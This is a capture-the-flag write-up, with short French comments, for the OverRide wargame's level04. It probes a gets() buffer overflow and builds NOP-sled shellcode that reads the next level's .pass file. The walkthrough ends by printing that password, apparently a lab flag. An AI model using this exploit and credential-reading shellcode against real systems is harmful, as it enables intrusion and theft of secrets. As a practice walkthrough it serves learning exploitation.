@@ -1,0 +1,130 @@
+level04@OverRide:~$ strings ./level04
+tdD
+/lib/ld-linux.so.2
+__gmon_start__
+libc.so.6
+_IO_stdin_used
+gets
+fflush
+wait
+__isoc99_scanf
+signal
+puts
+fork
+kill
+prctl
+getchar
+stdout
+alarm
+ptrace
+__libc_start_main
+GLIBC_2.7
+GLIBC_2.0
+PTRh
+UWVS
+[^_]
+Give me some shellcode, k
+child is exiting...
+no exec() for you
+;*2$"
+
+(gdb)
+0x080487d5 in main ()
+1: x/5i $pc
+=> 0x80487d5 <main+269>:	mov    DWORD PTR [esp],0x3
+   0x80487dc <main+276>:	call   0x8048570 <ptrace@plt>
+   0x80487e1 <main+281>:	mov    DWORD PTR [esp+0xa8],eax
+   0x80487e8 <main+288>:	cmp    DWORD PTR [esp+0xa8],0xb
+   0x80487f0 <main+296>:	jne    0x8048768 <main+160>
+(gdb)
+0x0804868f in prog_timeout ()
+1: x/5i $pc
+=> 0x804868f <prog_timeout>:	push   ebp
+   0x8048690 <prog_timeout+1>:	mov    ebp,esp
+   0x8048692 <prog_timeout+3>:	mov    eax,0x1
+   0x8048697 <prog_timeout+8>:	mov    ebx,0x1
+   0x804869c <prog_timeout+13>:	int    0x80
+
+Ici nous avons visiblement un programme qui joue sur des protection anti debugger.
+
+level04@OverRide:~$ ltrace ./level04
+__libc_start_main(0x80486c8, 1, -10556, 0x8048830, 0x80488a0 <unfinished ...>
+signal(14, 0x0804868f)                                  = NULL
+alarm(60)                                               = 0
+fork()                                                  = 5742
+wait(0xffffd58cGive me some shellcode, k
+ok
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... wait resumed> )                                    = 5742
+puts("child is exiting..."child is exiting...
+)                             = 20
++++ exited (status 0) +++
+
+Il recupere aussi une input avec gets
+
+level04@OverRide:~$ nm -u ./level04
+         w _Jv_RegisterClasses
+         w __gmon_start__
+         U __isoc99_scanf@@GLIBC_2.7
+         U __libc_start_main@@GLIBC_2.0
+         U alarm@@GLIBC_2.0
+         U fflush@@GLIBC_2.0
+         U fork@@GLIBC_2.0
+         U getchar@@GLIBC_2.0
+         U gets@@GLIBC_2.0
+         U kill@@GLIBC_2.0
+         U prctl@@GLIBC_2.0
+         U ptrace@@GLIBC_2.0
+         U puts@@GLIBC_2.0
+         U signal@@GLIBC_2.0
+         U wait@@GLIBC_2.0
+
+Essayons de trouver la taille du buffer
+
+level04@OverRide:~$ python -c 'print("a" * 200)' | ./level04
+Give me some shellcode, k
+^C
+level04@OverRide:~$ python -c 'print("a" * 100)' | ./level04
+Give me some shellcode, k
+child is exiting...
+
+On s'apercoit qu'elle est entre 100 et 200
+
+level04@OverRide:~$ python -c 'print("a" * 157)' | ./level04
+Give me some shellcode, k
+^C
+level04@OverRide:~$ python -c 'print("a" * 156)' | ./level04
+Give me some shellcode, k
+Give me some shellcode, k
+^C
+level04@OverRide:~$ python -c 'print("a" * 155)' | ./level04
+Give me some shellcode, k
+child is exiting...
+
+Sans penser au debugger pour le moment, essayons d'imaginer un exploit buffer overflow.
+
+level04@OverRide:~$ export SHELLCODE=$(python -c 'print("\x90" * 80 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass")')
+
+(gdb) x/32x *environ
+0xffffd7f4:	0x4c454853	0x444f434c	0x90903d45	0x90909090
+0xffffd804:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd814:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd824:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd834:	0x90909090	0x90909090	0x90909090	0x90909090
+
+level04@OverRide:~$ python -c 'print("a" * 152 + "\x24\xd8\xff\xff")' | ./level04
+Give me some shellcode, k
+Give me some shellcode, k
+
+^C
+level04@OverRide:~$ python -c 'print("a" * 154 + "\x24\xd8\xff\xff")' | ./level04
+Give me some shellcode, k
+^C
+level04@OverRide:~$ python -c 'print("a" * 155 + "\x24\xd8\xff\xff")' | ./level04
+Give me some shellcode, k
+^C
+level04@OverRide:~$ python -c 'print("a" * 156 + "\x24\xd8\xff\xff")' | ./level04
+Give me some shellcode, k
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+child is exiting...
